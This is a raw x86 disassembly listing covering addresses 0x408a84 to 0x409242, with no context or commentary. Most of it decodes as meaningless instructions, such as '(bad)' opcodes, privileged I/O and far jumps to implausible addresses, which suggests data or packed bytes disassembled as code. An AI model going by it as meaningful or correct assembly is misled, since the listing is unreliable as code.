  408a84:	mov    BYTE PTR [ecx-0x6c393521],0xe6
  408a8b:	dec    esp
  408a8c:	leave  
  408a8d:	sbb    ah,BYTE PTR [edi+0x49607b2e]
  408a93:	push   ss
  408a94:	ss adc al,0xdc
  408a97:	cmp    DWORD PTR [edi],0x649c1b3e
  408a9d:	jne    0x408ac8
  408a9f:	and    DWORD PTR [esi],ebp
  408aa1:	or     al,0x6c
  408aa3:	xchg   edi,eax
  408aa4:	hlt    
  408aa5:	mov    BYTE PTR [ebx+0x53cf9053],ah
  408aab:	stos   DWORD PTR es:[edi],eax
  408aac:	jb     0x408a73
  408aae:	or     dl,bl
  408ab0:	mov    esi,DWORD PTR [ebp-0x24b7315d]
  408ab6:	adc    bh,BYTE PTR [eax]
  408ab8:	rcr    edx,cl
  408aba:	fistp  DWORD PTR [ecx+0x25]
  408abd:	cmp    al,0xb5
  408abf:	lods   al,BYTE PTR ds:[esi]
  408ac0:	lahf   
  408ac1:	push   es
  408ac2:	push   ebx
  408ac3:	icebp  
  408ac4:	mov    ebx,0x75fbd25b
  408ac9:	js     0x408a75
  408acb:	jge    0x408aa2
  408acd:	and    DWORD PTR [esi-0x760ce2f],ebp
  408ad3:	lock mov ch,0x21
  408ad6:	neg    DWORD PTR ds:[ecx-0x5a7e2ed0]
  408add:	pop    ebp
  408ade:	or     ebp,ebp
  408ae0:	scas   al,BYTE PTR es:[edi]
  408ae1:	out    dx,eax
  408ae2:	pop    edi
  408ae3:	frstor [ecx-0x29]
  408ae6:	(bad)  
  408ae7:	mov    bl,0xe6
  408ae9:	inc    edx
  408aea:	inc    esi
  408aeb:	xchg   BYTE PTR [ebp+0x321e984a],ch
  408af1:	das    
  408af2:	pop    ss
  408af3:	retf   0x9dcd
  408af6:	test   al,0xa5
  408af8:	outs   dx,DWORD PTR ds:[esi]
  408af9:	mov    ds:0xc4286e93,al
  408afe:	push   edx
  408aff:	cmp    al,BYTE PTR [edi+0x7976fda3]
  408b05:	mov    al,ds:0x5781aed4
  408b0a:	lea    ebx,[esi]
  408b0c:	ror    BYTE PTR [edx+0x6a6332d6],1
  408b12:	sbb    ebp,DWORD PTR [ecx+0x5a]
  408b15:	sbb    al,0x26
  408b17:	mov    bh,0x93
  408b19:	imul   eax,DWORD PTR [eax+esi*2+0x4db57b68],0x7ca13279
  408b24:	cwde   
  408b25:	rep outs dx,BYTE PTR ds:[esi]
  408b27:	jbe    0x408b1a
  408b29:	cwde   
  408b2a:	int    0x71
  408b2c:	sbb    DWORD PTR [edx+0x2b6b8be2],ecx
  408b32:	xchg   edi,eax
  408b33:	xor    eax,0xc49ea381
  408b38:	push   edx
  408b39:	xchg   ecx,eax
  408b3a:	xchg   ebx,eax
  408b3b:	pop    esi
  408b3c:	aad    0xc8
  408b3e:	into   
  408b3f:	in     eax,dx
  408b40:	dec    ebx
  408b41:	ins    BYTE PTR es:[edi],dx
  408b42:	sti    
  408b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b44:	in     eax,dx
  408b45:	fisttp WORD PTR ds:0x367ac3c1
  408b4b:	(bad)  
  408b4c:	rcl    BYTE PTR [ecx],0xa1
  408b4f:	fimul  WORD PTR [edi-0x6398ded2]
  408b55:	lods   eax,DWORD PTR ds:[esi]
  408b56:	idiv   DWORD PTR [esi]
  408b58:	ret    
  408b59:	es adc al,0xc8
  408b5c:	iret   
  408b5d:	xchg   esp,eax
  408b5e:	jae    0x408b40
  408b60:	mov    ebp,DWORD PTR [esi-0x239cf594]
  408b66:	popfw  
  408b68:	shl    BYTE PTR [edi+0x5a],1
  408b6b:	adc    dl,dh
  408b6d:	or     esi,DWORD PTR [edi]
  408b6f:	xchg   ebp,eax
  408b70:	and    ah,cl
  408b72:	das    
  408b73:	rcl    bh,0x70
  408b76:	call   0xa1f1bc38
  408b7b:	lds    ecx,FWORD PTR [edi+0x6d]
  408b7e:	(bad)  
  408b7f:	pop    edi
  408b80:	xchg   ecx,eax
  408b81:	sub    eax,0x7e59534
  408b86:	pop    eax
  408b87:	div    DWORD PTR [edx-0x26acf5e4]
  408b8d:	pusha  
  408b8e:	in     al,0x3
  408b90:	and    al,BYTE PTR [ebx+0x29]
  408b93:	and    DWORD PTR [esi+0x2e9a1e5d],esi
  408b99:	pop    ebp
  408b9a:	push   eax
  408b9b:	mov    DWORD PTR [edi-0x2183488f],ebx
  408ba1:	pop    ecx
  408ba2:	jae    0x408ba2
  408ba4:	push   eax
  408ba5:	popa   
  408ba6:	cli    
  408ba7:	inc    esi
  408ba8:	int    0x6e
  408baa:	js     0x408b57
  408bac:	xchg   esi,eax
  408bad:	xchg   ch,bh
  408baf:	cdq    
  408bb0:	bound  edx,QWORD PTR [ebx-0x30]
  408bb3:	mov    ebp,0x76294b01
  408bb8:	rol    bh,0xa7
  408bbb:	cld    
  408bbc:	das    
  408bbd:	popf   
  408bbe:	mov    WORD PTR [edi+ebp*2-0xf973aa9],es
  408bc5:	lods   eax,DWORD PTR ds:[esi]
  408bc6:	out    dx,eax
  408bc7:	imul   esp,DWORD PTR [esi],0x4e
  408bca:	xor    ebx,DWORD PTR [edi+0x27]
  408bcd:	xchg   esp,eax
  408bce:	jmp    0x408b61
  408bd0:	xor    eax,0xa7ea1ee0
  408bd5:	dec    edi
  408bd6:	mov    bl,0xff
  408bd8:	lds    ecx,FWORD PTR [ebp+eax*1-0x413d8cf]
  408bdf:	mov    cl,0x61
  408be1:	cmp    al,0x55
  408be3:	cmp    DWORD PTR [ebp+esi*1+0x2d],edx
  408be7:	aaa    
  408be8:	(bad)  
  408be9:	shr    BYTE PTR [ecx-0x4b180cd8],cl
  408bef:	sub    bh,BYTE PTR [edx+edi*8]
  408bf2:	xchg   esi,eax
  408bf3:	sub    eax,0xe683c294
  408bf8:	sbb    BYTE PTR [eax],dh
  408bfa:	xchg   esi,eax
  408bfb:	push   ebp
  408bfc:	imul   ecx,DWORD PTR [edx+0x49f9239f],0x43070c2c
  408c06:	loop   0x408b91
  408c08:	not    BYTE PTR [edi-0x6a]
  408c0b:	add    eax,0x8848d4c
  408c10:	cmc    
  408c11:	jb     0x408c45
  408c13:	add    BYTE PTR [ecx+0x458b0845],cl
  408c19:	hlt    
  408c1a:	mov    ecx,DWORD PTR [ebp+0x14]
  408c1d:	xor    eax,esi
  408c1f:	add    eax,edi
  408c21:	imul   eax,DWORD PTR [ecx]
  408c24:	mov    ecx,DWORD PTR [ebp-0x4]
  408c27:	mov    edx,DWORD PTR [ebp+0x8]
  408c2a:	xor    ecx,esi
  408c2c:	lea    ecx,[ecx+edx*1+0x3272f5]
  408c33:	cmp    ecx,eax
  408c35:	jne    0x406849
  408c3b:	jmp    0x40afcd
  408c40:	or     eax,0xbf3c7fd1
  408c45:	mov    cl,BYTE PTR [edx]
  408c47:	into   
  408c48:	and    bl,BYTE PTR [ebx]
  408c4a:	and    eax,0xaceec52a
  408c4f:	je     0x408bed
  408c51:	sbb    BYTE PTR [ebx-0x7ca1f37d],al
  408c57:	add    DWORD PTR [ebp-0x72],0xffffffab
  408c5b:	sub    al,0x8c
  408c5d:	daa    
  408c5e:	sub    edi,DWORD PTR [edi+0x1864de5c]
  408c64:	inc    ebp
  408c65:	cmp    eax,0x77bd96a7
  408c6a:	adc    eax,0xa730dcae
  408c6f:	fcmovb st,st(2)
  408c71:	jmp    0x4a2b0862
  408c76:	lea    eax,[edx]
  408c78:	mov    cl,0x9
  408c7a:	pusha  
  408c7b:	les    esi,FWORD PTR [ebx]
  408c7d:	pop    edx
  408c7e:	inc    ebx
  408c7f:	xchg   edi,eax
  408c80:	xchg   esi,eax
  408c81:	push   ss
  408c82:	in     al,dx
  408c83:	jne    0x408c16
  408c85:	sbb    eax,ebx
  408c87:	mov    ebx,0xb0822752
  408c8c:	mov    ebp,0x85d7684b
  408c91:	add    DWORD PTR [edx-0x1a],edi
  408c94:	push   cs
  408c95:	fs pop es
  408c97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c98:	nop
  408c99:	imul   ebx,DWORD PTR [edi+0x4a],0xffffffe8
  408c9d:	neg    DWORD PTR [edx]
  408c9f:	push   ebp
  408ca0:	and    al,0xb9
  408ca2:	pop    esp
  408ca3:	cmp    al,0x3
  408ca5:	mov    ah,0x8f
  408ca7:	test   eax,0xd698faaa
  408cac:	call   edx
  408cae:	scas   al,BYTE PTR es:[edi]
  408caf:	pop    ss
  408cb0:	cmp    eax,0xc70a8846
  408cb5:	loop   0x408c5f
  408cb7:	in     al,dx
  408cb8:	popf   
  408cb9:	scas   al,BYTE PTR es:[edi]
  408cba:	push   esi
  408cbb:	cmp    ecx,esp
  408cbd:	pop    eax
  408cbe:	inc    ebx
  408cbf:	cmp    bh,BYTE PTR [ebx+0x31]
  408cc2:	lods   eax,DWORD PTR ds:[esi]
  408cc3:	adc    DWORD PTR [edx-0x340ee6d3],edx
  408cc9:	call   0x49002683
  408cce:	add    DWORD PTR [eax-0xc],esi
  408cd1:	nop
  408cd2:	mov    ds:0xb06df39f,al
  408cd7:	xor    eax,0xac94f321
  408cdc:	frstor [eax]
  408cde:	inc    ebp
  408cdf:	mov    eax,ds:0x566f8306
  408ce4:	push   esi
  408ce5:	fiadd  DWORD PTR [edx-0x36]
  408ce8:	cmp    al,0x10
  408cea:	mov    bh,0xda
  408cec:	mov    bl,0x51
  408cee:	and    esp,DWORD PTR [ebp+0x4c]
  408cf1:	ins    BYTE PTR es:[edi],dx
  408cf2:	push   0x83bfc0e1
  408cf7:	push   esi
  408cf8:	xor    esi,eax
  408cfa:	add    al,BYTE PTR [edi]
  408cfc:	inc    edi
  408cfd:	iret   
  408cfe:	and    DWORD PTR [edx],ebx
  408d00:	inc    esi
  408d01:	sti    
  408d02:	fadd   DWORD PTR [ebp-0x5638423]
  408d08:	mov    bh,0xd6
  408d0a:	je     0x408d7c
  408d0c:	mov    ebp,0x8b00baf9
  408d11:	cmc    
  408d12:	sub    al,0x67
  408d14:	xor    ah,dl
  408d16:	stos   BYTE PTR es:[edi],al
  408d17:	(bad)  
  408d18:	mov    bh,0x61
  408d1a:	pop    esi
  408d1b:	scas   al,BYTE PTR es:[edi]
  408d1c:	jecxz  0x408d4a
  408d1e:	sub    ah,BYTE PTR [esi+0x2d]
  408d21:	mov    edi,DWORD PTR ss:[ecx]
  408d24:	and    al,0xa3
  408d26:	push   ebp
  408d27:	adc    ebx,DWORD PTR [ebx+0x12ef7bea]
  408d2d:	aaa    
  408d2e:	add    ah,BYTE PTR [edx-0x13]
  408d31:	dec    ecx
  408d32:	inc    esi
  408d33:	push   edx
  408d34:	daa    
  408d35:	call   0x3aa1aeda
  408d3a:	(bad)  
  408d3b:	fcomi  st,st(1)
  408d3d:	aam    0x4b
  408d3f:	aas    
  408d40:	mov    ebx,0xb6bf8b24
  408d45:	add    dh,cl
  408d47:	ret    
  408d48:	sbb    edx,DWORD PTR [edx+0x5e]
  408d4b:	mov    BYTE PTR [edi],0xdd
  408d4e:	cmp    DWORD PTR [ebx+0x64e5a48c],0x3b92a7e5
  408d58:	xchg   DWORD PTR [esi-0x6c4904f4],eax
  408d5e:	sbb    al,0xac
  408d60:	popf   
  408d61:	(bad)  
  408d63:	pushf  
  408d64:	(bad)
  408d67:	pop    ecx
  408d68:	mov    al,0xcc
  408d6a:	popf   
  408d6b:	cmp    ebp,DWORD PTR [edi]
  408d6d:	mov    esp,0xe3c999ca
  408d72:	inc    ecx
  408d73:	hlt    
  408d74:	fdiv   QWORD PTR [esi]
  408d76:	push   ecx
  408d77:	or     bh,al
  408d79:	dec    esp
  408d7a:	mov    dh,0xb1
  408d7c:	stos   BYTE PTR es:[edi],al
  408d7d:	rcr    BYTE PTR [ebx-0x2a],0xbe
  408d81:	mov    esi,0xd8042c63
  408d86:	pop    es
  408d87:	mov    ecx,0xf5ab99e7
  408d8c:	sahf   
  408d8d:	mov    WORD PTR [ebx+0x76],ss
  408d90:	ficom  DWORD PTR [eax]
  408d92:	jno    0x408d66
  408d94:	fnsave [ebp+0x54]
  408d97:	cld    
  408d98:	push   esi
  408d99:	stos   DWORD PTR es:[edi],eax
  408d9a:	add    ebx,DWORD PTR [edi-0x38]
  408d9d:	fs inc edi
  408d9f:	add    ah,BYTE PTR [esi-0x1b540cfb]
  408da5:	sub    DWORD PTR gs:[ecx+0x21e4de82],esi
  408dac:	scas   al,BYTE PTR es:[edi]
  408dad:	push   0x99807eed
  408db2:	fiadd  WORD PTR ds:0x1bdbca02
  408db8:	or     BYTE PTR [edx-0x7c05b03f],bh
  408dbe:	into   
  408dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dc0:	and    ah,BYTE PTR [ebx+0x124beb44]
  408dc6:	xor    DWORD PTR [eax],edi
  408dc8:	(bad)  
  408dca:	sub    BYTE PTR [esi+0x62a8512c],0xca
  408dd1:	jle    0x408dd7
  408dd3:	popa   
  408dd4:	call   0x117a3e45
  408dd9:	or     ecx,ecx
  408ddb:	mov    eax,ds:0x3442fa12
  408de0:	popf   
  408de1:	jecxz  0x408d88
  408de3:	cmp    eax,0xbef107b
  408de8:	shl    DWORD PTR [eax],0xd2
  408deb:	mov    ah,0xe3
  408ded:	sub    bl,dl
  408def:	adc    ah,BYTE PTR [ebx+0x24]
  408df2:	inc    edx
  408df3:	mov    dl,0x1a
  408df5:	jmp    0x408e5e
  408df7:	lahf   
  408df8:	pop    esi
  408df9:	pusha  
  408dfa:	mov    ah,0xe6
  408dfc:	jno    0x408e1b
  408dfe:	ins    DWORD PTR es:[edi],dx
  408dff:	add    BYTE PTR [esi+edi*2],al
  408e02:	inc    ecx
  408e03:	push   ebp
  408e04:	mov    dh,0xf9
  408e06:	fsubrp st(2),st
  408e08:	mov    DWORD PTR [ecx+0x7e3acd9f],ebp
  408e0e:	sar    DWORD PTR [ebx-0x5d2d48fa],1
  408e14:	pop    ds
  408e15:	pop    eax
  408e16:	imul   ecx,DWORD PTR [esi],0x1f01ec3e
  408e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e1d:	cmp    dl,ah
  408e1f:	pop    ecx
  408e20:	and    al,0xc2
  408e22:	sar    DWORD PTR ds:0x818fd652,cl
  408e28:	mov    edi,0x91503718
  408e2d:	push   esi
  408e2e:	test   BYTE PTR [esi],0x81
  408e31:	dec    DWORD PTR [esi]
  408e33:	and    ecx,DWORD PTR [eax+esi*2]
  408e36:	imul   ebx,eax,0xd
  408e39:	adc    ax,0xdcf5
  408e3d:	les    esi,FWORD PTR [ecx*2-0x75f78134]
  408e44:	sbb    bh,BYTE PTR [eax+0x5f0664e4]
  408e4a:	and    eax,0xff084673
  408e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e50:	mov    ecx,0x397b2355
  408e55:	jge    0x408e9c
  408e57:	sub    ebp,DWORD PTR [edi]
  408e59:	push   esp
  408e5a:	fwait
  408e5b:	loop   0x408ddd
  408e5d:	enter  0x369e,0xc8
  408e61:	gs push es
  408e63:	push   es
  408e64:	mov    ebp,0x2be4d982
  408e69:	inc    eax
  408e6a:	int3   
  408e6b:	adc    esp,DWORD PTR [ecx-0x7]
  408e6e:	lods   al,BYTE PTR ds:[esi]
  408e6f:	inc    ebx
  408e70:	dec    edx
  408e71:	dec    ebp
  408e72:	jb     0x408ed9
  408e74:	cmp    bl,BYTE PTR [ebx+0x1dd8da87]
  408e7a:	or     eax,0x2125ef12
  408e7f:	push   esp
  408e80:	cmp    BYTE PTR [edx],al
  408e82:	arpl   WORD PTR ds:[esi],ax
  408e85:	loopne 0x408e17
  408e87:	enter  0x4e8b,0x53
  408e8b:	out    dx,eax
  408e8c:	loopne 0x408e43
  408e8e:	enter  0xae9e,0x9e
  408e92:	pop    ecx
  408e93:	and    ebx,DWORD PTR [edi-0xc36c549]
  408e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e9a:	push   edi
  408e9b:	jno    0x408ec7
  408e9d:	arpl   WORD PTR [ecx-0x6a],sp
  408ea0:	inc    esi
  408ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ea2:	mov    dh,0x48
  408ea4:	adc    al,0xde
  408ea6:	xchg   ecx,eax
  408ea7:	dec    esp
  408ea8:	fstp   TBYTE PTR [ebp+0x23f51ed1]
  408eae:	xchg   edx,eax
  408eaf:	jb     0x408eb0
  408eb1:	pop    es
  408eb2:	fadd   st,st(5)
  408eb4:	call   0x8bae5b76
  408eb9:	dec    esi
  408eba:	lock imul BYTE PTR [esi+0x72]
  408ebe:	das    
  408ebf:	stc    
  408ec0:	sbb    al,0xf2
  408ec2:	xchg   ebx,eax
  408ec3:	pop    ebx
  408ec4:	jb     0x408e62
  408ec6:	inc    esp
  408ec7:	and    BYTE PTR [esi],0x10
  408eca:	xor    DWORD PTR [ebx+0x2d],edx
  408ecd:	pop    es
  408ece:	in     al,dx
  408ecf:	or     edx,DWORD PTR [ebp+0x2b]
  408ed2:	xor    DWORD PTR [ecx+0x35],0x9d12e67e
  408ed9:	cmp    BYTE PTR [ebx+0x7a],bh
  408edc:	ss or  al,cl
  408edf:	mov    edx,?
  408ee1:	add    BYTE PTR [ebp-0x1bf9a672],dl
  408ee7:	ret    
  408ee8:	js     0x408e96
  408eea:	fst    DWORD PTR [edx]
  408eec:	mov    ah,0xf1
  408eee:	xor    ah,BYTE PTR [bp+di-0x1536]
  408ef3:	jmp    0x408f70
  408ef5:	int    0xa
  408ef7:	push   edi
  408ef8:	mov    esi,0x65a7d5ee
  408efd:	dec    eax
  408efe:	inc    eax
  408eff:	cdq    
  408f00:	inc    esi
  408f01:	jno    0x408f0d
  408f03:	push   ecx
  408f04:	dec    ebp
  408f05:	mov    cl,0x77
  408f07:	adc    dh,ch
  408f09:	es dec edi
  408f0b:	jne    0x408f26
  408f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f0e:	mov    dl,0x28
  408f10:	cli    
  408f11:	ins    BYTE PTR es:[edi],dx
  408f12:	les    eax,FWORD PTR [esp+esi*4-0x12441cac]
  408f19:	scas   al,BYTE PTR es:[edi]
  408f1a:	inc    esp
  408f1b:	nop
  408f1c:	rcr    BYTE PTR [ebx-0x69],cl
  408f1f:	mov    DWORD PTR [eax+edi*4-0x77],0x2e3841c9
  408f27:	data16 (bad) 
  408f29:	fs dec esp
  408f2b:	mov    BYTE PTR [ecx],al
  408f2d:	pushf  
  408f2e:	fst    st(5)
  408f30:	push   ss
  408f31:	sub    DWORD PTR [ebx],edx
  408f33:	pop    esi
  408f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f35:	xor    edi,DWORD PTR [eax+ecx*2+0x70aea049]
  408f3c:	sti    
  408f3d:	mov    ch,0x4a
  408f3f:	sub    eax,0xc5dcb226
  408f44:	jge    0x408fb1
  408f46:	mov    DWORD PTR ds:0xcefa619b,edx
  408f4c:	sub    dh,BYTE PTR [ecx+0x5288c7a6]
  408f52:	dec    edi
  408f53:	inc    edx
  408f54:	outs   dx,DWORD PTR ds:[esi]
  408f55:	fdecstp 
  408f57:	or     eax,0x27e92dfa
  408f5c:	pop    ebx
  408f5d:	adc    ecx,ecx
  408f5f:	dec    esi
  408f60:	sub    al,0x12
  408f62:	add    bh,ah
  408f64:	sub    DWORD PTR [eax+0x51],edi
  408f67:	stos   DWORD PTR es:[edi],eax
  408f68:	cmc    
  408f69:	dec    edi
  408f6a:	rcl    DWORD PTR [ebx],0xa2
  408f6d:	(bad)  
  408f6e:	ins    BYTE PTR es:[edi],dx
  408f6f:	jecxz  0x408efb
  408f71:	popa   
  408f72:	call   0xb8f7e1d1
  408f77:	sub    esi,ebx
  408f79:	dec    edi
  408f7a:	les    ebx,FWORD PTR [edi+eiz*1+0x3cc7c6f3]
  408f81:	jle    0x408fa4
  408f83:	adc    esi,DWORD PTR [ecx+0x51]
  408f86:	imul   esi,DWORD PTR [edi+eiz*4-0x6f],0x8ef574bf
  408f8e:	cmp    DWORD PTR [eax],esp
  408f90:	les    edx,FWORD PTR [ecx+0x7d]
  408f93:	inc    edx
  408f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f95:	int    0xf7
  408f97:	mov    ch,0x72
  408f99:	test   eax,0x48c251dd
  408f9e:	les    ecx,FWORD PTR [ebp+ebx*4+0x66]
  408fa2:	retf   0xec8f
  408fa5:	mul    BYTE PTR [ebp-0x6c6f7de0]
  408fab:	xor    ebp,ecx
  408fad:	cdq    
  408fae:	add    DWORD PTR [ecx-0x7f7b233a],esp
  408fb4:	(bad)  
  408fb5:	or     eax,0x322e9e4d
  408fba:	imul   ecx,DWORD PTR [ecx],0xe56b4fae
  408fc0:	dec    ecx
  408fc1:	xchg   ebx,eax
  408fc2:	and    ecx,DWORD PTR [edi+edx*2-0x3234d9a9]
  408fc9:	jg     0x408fc6
  408fcb:	mov    WORD PTR [eax],gs
  408fcd:	mov    eax,0x80e9e395
  408fd2:	dec    edi
  408fd3:	cmp    BYTE PTR [esi],al
  408fd5:	sbb    al,0x92
  408fd7:	xchg   eax,ebp
  408fd9:	jno    0x40901a
  408fdb:	fisubr DWORD PTR [edi+0x35]
  408fde:	pop    edi
  408fdf:	ret    
  408fe0:	test   eax,0x62e9f049
  408fe5:	mov    edi,0x473a0ac9
  408fea:	or     ebp,ebx
  408fec:	or     ebp,esp
  408fee:	pushf  
  408fef:	fwait
  408ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ff1:	mov    ds:0x958b8096,al
  408ff6:	cmc    
  408ff7:	xchg   ecx,eax
  408ff8:	mov    BYTE PTR [esi],cl
  408ffa:	dec    edi
  408ffb:	inc    edx
  408ffc:	ret    
  408ffd:	sti    
  408ffe:	lods   al,BYTE PTR ds:[esi]
  408fff:	push   ebx
  409000:	test   BYTE PTR [edi],ah
  409002:	adc    eax,0x2318ae7c
  409007:	scas   al,BYTE PTR es:[edi]
  409008:	sti    
  409009:	xor    DWORD PTR [ebp+0x79db82c7],ebp
  40900f:	add    dl,BYTE PTR [edx-0x1923e63e]
  409015:	les    eax,FWORD PTR [ebp+0x1258131b]
  40901b:	ret    0x684b
  40901e:	cmp    eax,0xc801a31a
  409023:	push   esi
  409024:	enter  0x3594,0x9b
  409028:	enter  0x7901,0xdf
  40902c:	(bad)  
  40902d:	fwait
  40902e:	sub    eax,0x6680fc42
  409033:	add    eax,0xf7da54d4
  409038:	in     eax,0x8a
  40903a:	adc    DWORD PTR [edx-0x7b3afbe7],ebp
  409040:	or     edx,eax
  409042:	sub    BYTE PTR [edx+0x2552b330],ch
  409048:	stos   DWORD PTR es:[edi],eax
  409049:	scas   al,BYTE PTR es:[edi]
  40904a:	sub    eax,0x3f2d643c
  40904f:	in     al,dx
  409050:	cmp    DWORD PTR [esi-0x4b],eax
  409053:	sub    DWORD PTR [ecx+0x23c28418],edi
  409059:	xor    esi,DWORD PTR [edx-0x4c6d4038]
  40905f:	pop    eax
  409060:	pop    ebx
  409061:	xor    eax,0x1d8eda1e
  409066:	in     al,0x43
  409068:	icebp  
  409069:	mov    ds:0xebe62b33,al
  40906e:	sbb    DWORD PTR [eax],eax
  409070:	jl     0x4090e1
  409072:	sbb    ebp,esi
  409074:	xchg   BYTE PTR [eax+0x0],dl
  409077:	stc    
  409078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409079:	retf   
  40907a:	out    0x8e,al
  40907c:	shl    DWORD PTR [ebp+edx*2-0x2],1
  409080:	sbb    eax,0xbdf8caf2
  409085:	retf   0x3c91
  409088:	pusha  
  409089:	jmp    0xe3feef1f
  40908e:	xchg   esi,eax
  40908f:	daa    
  409090:	adc    BYTE PTR cs:0xbb4cc03b,bh
  409097:	scas   al,BYTE PTR es:[edi]
  409098:	cs inc edx
  40909a:	in     al,0x6c
  40909c:	clc    
  40909d:	mov    dl,0xaa
  40909f:	jl     0x409086
  4090a1:	fs push es
  4090a3:	cmp    eax,0xc4fe6a4
  4090a8:	push   esp
  4090a9:	inc    ebp
  4090aa:	int3   
  4090ab:	daa    
  4090ac:	xchg   esp,eax
  4090ad:	jne    0x409062
  4090af:	jne    0x409130
  4090b1:	retf   
  4090b2:	cmp    al,0x3f
  4090b4:	jnp    0x40904b
  4090b6:	ins    BYTE PTR es:[edi],dx
  4090b7:	sahf   
  4090b8:	xchg   BYTE PTR [eax+0x651316e6],al
  4090be:	xlat   BYTE PTR ds:[ebx]
  4090bf:	xchg   edx,eax
  4090c0:	xchg   ebx,eax
  4090c1:	aas    
  4090c2:	shr    ebx,1
  4090c4:	mov    edx,0x1ef4ef85
  4090c9:	inc    edi
  4090ca:	jne    0x4090a2
  4090cc:	rcl    DWORD PTR ds:0x35245969,1
  4090d2:	inc    edx
  4090d3:	dec    ecx
  4090d4:	lahf   
  4090d5:	pop    edi
  4090d6:	or     eax,0xa8695045
  4090db:	in     al,0x96
  4090dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090de:	clc    
  4090df:	into   
  4090e0:	lahf   
  4090e1:	out    0x50,al
  4090e3:	pop    ebx
  4090e4:	jle    0x4090d8
  4090e6:	inc    eax
  4090e7:	out    dx,al
  4090e8:	jmp    0x41b:0x38069496
  4090ef:	mov    esp,0xb30fcab0
  4090f4:	mov    dh,0xea
  4090f6:	push   cs
  4090f7:	pusha  
  4090f8:	mov    esi,0xf5e9b2df
  4090fd:	and    eax,edx
  4090ff:	loopne 0x409132
  409101:	ins    BYTE PTR es:[edi],dx
  409102:	sub    edi,eax
  409104:	mov    edi,ebx
  409106:	scas   eax,DWORD PTR es:[edi]
  409107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409108:	mov    al,0x24
  40910a:	sbb    ah,dl
  40910c:	push   eax
  40910d:	mov    DWORD PTR [eax-0x68],ecx
  409110:	push   0xffffff90
  409112:	xchg   BYTE PTR [ebx-0x14f780e4],bh
  409118:	aaa    
  409119:	push   esp
  40911a:	iret   
  40911b:	mul    DWORD PTR [ecx]
  40911d:	fmul   DWORD PTR [edi-0x5e5600f4]
  409123:	cdq    
  409124:	jmp    0xe0de:0xef810a2d
  40912b:	dec    esi
  40912c:	and    ecx,DWORD PTR [eax+0x58]
  40912f:	ret    
  409130:	mov    edx,0xba3b7dbd
  409135:	fldcw  WORD PTR [edi]
  409137:	jmp    0x409178
  409139:	fs test al,0xdb
  40913c:	call   0x2de2e579
  409141:	cmp    cl,BYTE PTR [edi*2+0x326bb8bb]
  409148:	or     esp,DWORD PTR [edx+0x16]
  40914b:	mov    eax,0x6bc6625
  409150:	fsubr  st,st(1)
  409152:	push   es
  409153:	sbb    ebx,esp
  409155:	ss (bad) 
  409157:	jmp    0xd981:0x73d73f3f
  40915e:	fisub  DWORD PTR [eax+ebp*4-0x5fb5ed4]
  409165:	(bad)  
  409166:	cmp    esp,ecx
  409168:	sahf   
  409169:	clc    
  40916a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40916b:	push   cs
  40916c:	dec    edx
  40916d:	adc    ch,BYTE PTR [edx+0x24]
  409170:	mov    ecx,0x5de0e7ea
  409175:	fidivr DWORD PTR [ecx+ebp*2-0x3e89f3ad]
  40917c:	cmc    
  40917d:	test   eax,0x98725524
  409182:	rol    DWORD PTR [ebx-0x24],1
  409185:	popf   
  409186:	shl    DWORD PTR [esi],cl
  409188:	pop    eax
  409189:	cld    
  40918a:	jmp    0xef652d9d
  40918f:	js     0x4091ea
  409191:	mov    edi,0x58fb5faa
  409196:	jmp    0x3999:0x9c10fa5d
  40919d:	sbb    DWORD PTR [edx-0x3e6a7062],ecx
  4091a3:	pop    eax
  4091a4:	mov    ds:0xce286ed0,al
  4091a9:	adc    al,0xde
  4091ab:	adc    DWORD PTR [ecx],edx
  4091ad:	jge    0x40921f
  4091af:	jmp    DWORD PTR [edi-0x3acfad56]
  4091b5:	mov    edx,0xabcbae07
  4091ba:	stos   DWORD PTR es:[edi],eax
  4091bb:	xchg   BYTE PTR [edi+0x51c638d3],dh
  4091c1:	ss (bad) 
  4091c3:	jmp    0xa7ce6406
  4091c8:	or     dh,BYTE PTR [ebp+0x59]
  4091cb:	cli    
  4091cc:	sub    BYTE PTR ds:0x49832668,bl
  4091d2:	(bad)  
  4091d6:	scas   eax,DWORD PTR es:[edi]
  4091d7:	stos   DWORD PTR es:[edi],eax
  4091d8:	jp     0x409197
  4091da:	test   eax,0x81488a4a
  4091df:	icebp  
  4091e0:	gs jmp 0x8ccebd6f
  4091e6:	jmp    0x409171
  4091e8:	ffree  st(0)
  4091ea:	mov    ds:0xbf1ffc3e,al
  4091ef:	jbe    0x4091d6
  4091f1:	cdq    
  4091f2:	sub    edx,edi
  4091f4:	or     al,0x1d
  4091f6:	shl    BYTE PTR [ecx+0x39f032f6],0x69
  4091fd:	lds    edi,FWORD PTR ds:0xf8fa81e6
  409203:	das    
  409204:	xor    ecx,DWORD PTR [ebx-0x282169f4]
  40920a:	mov    ds:0x89bc1c3a,eax
  40920f:	xchg   DWORD PTR [ebx+edi*2-0x5a1080a2],esi
  409216:	je     0x4091cc
  409218:	adc    eax,0x4f16b570
  40921d:	shl    DWORD PTR [ebx],cl
  40921f:	dec    edi
  409220:	jg     0x409201
  409222:	dec    edx
  409223:	fs ins DWORD PTR es:[edi],dx
  409225:	or     al,0x8d
  409228:	cld    
  409229:	fs xchg edx,eax
  40922b:	mov    ?,WORD PTR [eax+0x3b]
  40922e:	outs   dx,DWORD PTR ds:[esi]
  40922f:	sub    DWORD PTR [ecx+0x28],0xdad241ca
  409236:	mov    edx,DWORD PTR [edi-0x12]
  409239:	adc    ebp,esi
  40923b:	dec    eax
  40923c:	pop    ebx
  40923d:	jmp    0xca194c0
  409242:	push   0xc0cffbff
